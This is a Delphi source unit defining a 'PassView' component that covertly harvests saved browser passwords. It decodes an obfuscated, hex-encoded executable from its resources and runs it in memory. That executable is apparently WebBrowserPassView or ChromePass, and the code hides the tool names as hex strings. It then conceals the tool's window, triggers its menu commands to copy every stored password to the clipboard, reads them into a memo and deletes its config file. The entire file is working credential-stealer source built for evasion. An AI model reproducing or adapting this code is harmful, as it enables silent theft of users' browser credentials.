unit PassView;

interface

uses GetLibModHandlePassView, CodeUnitPassView, STPassView, WinApi.Windows,
      System.SysUtils, System.Classes, Vcl.StdCtrls, Vcl.Clipbrd;

type
  TMethodEx = ( WebBrowserPassView, ChromePassView );
  TPassView = class(TComponent)

private
  FMethod: TMethodEx;
  FMemo: TMemo;
  FTime: integer;
  procedure SetMethod(Value: TMethodEx);
  function GetMethod: TMethodEx;
  procedure SetMemo(Value: TMemo);
protected
public
  constructor Create(AOwner: TComponent); override;
  destructor Destroy; override;
  procedure Execute;
published
  property Method: TMethodEx read GetMethod write SetMethod;
  property Memo: TMemo read FMemo write SetMemo;
  property Delay: integer read FTime write FTime;
end;

const
  {$EXTERNALSYM WM_COMMAND}
  WM_COMMAND = $0111;
  {$EXTERNALSYM WM_CLOSE}
  WM_CLOSE            = $0010;


procedure Register;

implementation

{$R txt.RES}

function GetStringFromRes(NameRes: string; TypeRes: PWideChar; Line: integer): string;
var
  Stream: TResourceStream;
  StringList: TStringList;
begin
  StringList := TStringList.Create;
  Stream := TResourceStream.Create(HInstance, NameRes, TypeRes);
  try
    StringList.LoadFromStream(Stream);
    Result := StringList.Strings[Line]
  finally
    StringList.Free;
    Stream.Free;
  end;
end;

function WXE(s: string): string;
var i: integer;
begin
result := s;
for i := 1 to length(s) do
case ord(s[i]) of
ord('A')..ord('M'),ord('a')..ord('m'): result[i] := chr(ord(s[i])+13);
ord('N')..ord('Z'),ord('n')..ord('z'): result[i] := chr(ord(s[i])-13);
ord('0')..ord('4'): result[i] := chr(ord(s[i])+5);
ord('5')..ord('9'): result[i] := chr(ord(s[i])-5);
end;
end;

//метод из Hex в строку
function HTS(hex: Ansistring): Ansistring;
var
  i: Integer;
begin
  for i:= 1 to Length(hex) div 2 do
  begin
    Result:= Result + AnsiChar(StrToInt('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
  end;
end;

//метод дешифрует массив строк
function HATStr(const hexarr:array of string): Ansistring;
var
 i:Integer;
begin
  for i:= 0 to Length(hexarr)-1 do
  begin
    Result :=  HTS(AnsiString(hexarr[i]));
  end;
end;

function GetWB(lpWindowName: PWideChar): string;
var
  H: HWND;
  hmen,hSubmenu: HMenu;
  dwIDMenuItem:DWORD;
  s:array[0..MAX_PATH-1] of Char;
  TResult: string;
begin
//  H := 0;
  repeat
    H := FindWindow(nil, lpWindowName);
    ShowWindow(H, 0);
    if H = 0 then Sleep(1000);
  until H <> 0;
  hmen := GetMenu(H);
  hSubmenu:=GetSubMenu(hMen,1);
  dwIDMenuItem:=GetMenuItemID(hSubmenu,4);
  GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
  PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
  dwIDMenuItem:=GetMenuItemID(hSubmenu,1);
  GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
  PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
  Sleep(1000);
  TResult := Clipboard.AsText;
  PostMessage(H, WM_CLOSE, 0, 0);
  Result := TResult;
end;

function GetCHR(lpWindowName: PWideChar): string;
var
  H: HWND;
  hmen,hSubmenu: HMenu;
  dwIDMenuItem:DWORD;
  s:array[0..MAX_PATH-1] of Char;
  TResult: string;
begin
//  H := 0;
  repeat
    H := FindWindow(nil, lpWindowName);
    ShowWindow(H, 0);
    if H = 0 then Sleep(1000);
  until H <> 0;
  hmen := GetMenu(H);
  hSubmenu:=GetSubMenu(hMen,1);
  dwIDMenuItem:=GetMenuItemID(hSubmenu,3);
  GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
  PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
  dwIDMenuItem:=GetMenuItemID(hSubmenu,1);
  GetMenuString(hSubmenu,dwIDMenuItem,s,MAX_PATH,MF_BYCOMMAND);
  PostMessage(H,WM_COMMAND,dwIDMenuItem,0);
  Sleep(1000);
  TResult := Clipboard.AsText;
  PostMessage(H, WM_CLOSE, 0, 0);
  Result := TResult;
end;

function IntToStr(I : Longint) : string;
var
  s:string[255];
begin
  Str(I, s);
  Result := string(s);
end;

constructor TPassView.Create(AOwner:TComponent);
begin
  inherited Create(AOwner);
  FTime := 3000;
end;

destructor TPassView.Destroy;
begin
  inherited;
end;

procedure TPassView.SetMemo(Value: TMemo);
begin
  if FMemo <> Value then
  begin
    FMemo := Value;
  end;
end;

function TPassView.GetMethod: TMethodEx;
begin
  Result := FMethod;
end;

procedure TPassView.SetMethod(Value: TMethodEx);
begin
  FMethod := Value;
end;

procedure TPassView.Execute;
const
  // WebBrowserPassView
  HCom77:Array[0..17] of string=('57','65','62','42','72','6F','77','73','65','72','50','61','73','73','56',
  '69','65','77');
  // Chromepass
  HCom66:Array[0..9] of string=('43','68','72','6F','6D','65','70','61','73','73');
var
  Com77, Com66: string;
  WB, CP: string;
  Buf: TArray<Byte>;
begin
  if FMethod = WebBrowserPassView then
  begin
    //снимаем пароли
    DeleteFile(ExtractFilePath(ParamStr(0)) +
    ChangeFileExt(ExtractFileName(ParamStr(0)), '') + '.cfg');
    WB := WXE(GetStringFromRes('txt', 'TXTFILE', 0));
    StrHexToArrayByte(WB, Buf);
    MemExec(@Buf[0], ParamStr(0), '', 0);
    Sleep(FTime);
    Com77 := string(HATStr(HCom77));
    FMemo.Text := GetWB(PChar(Com77));
    DeleteFile(ExtractFilePath(ParamStr(0)) +
    ChangeFileExt(ExtractFileName(ParamStr(0)), '') + '.cfg');
  end
  else
  if FMethod = ChromePassView then
  begin
    DeleteFile(ExtractFilePath(ParamStr(0)) +
    ChangeFileExt(ExtractFileName(ParamStr(0)), '') + '.cfg');
    CP := WXE(GetStringFromRes('txt', 'TXTFILE', 1));
    StrHexToArrayByte(CP, Buf);
    MemExec(@Buf[0], ParamStr(0), '', 0);
    Sleep(FTime);
    Com66 := string(HATStr(HCom66));
    FMemo.Text := GetCHR(PChar(Com66));
    DeleteFile(ExtractFilePath(ParamStr(0)) +
    ChangeFileExt(ExtractFileName(ParamStr(0)), '') + '.cfg');
  end;
end;

procedure Register;
begin
  RegisterComponents('ZERO COM', [TPassView]);
end;

end.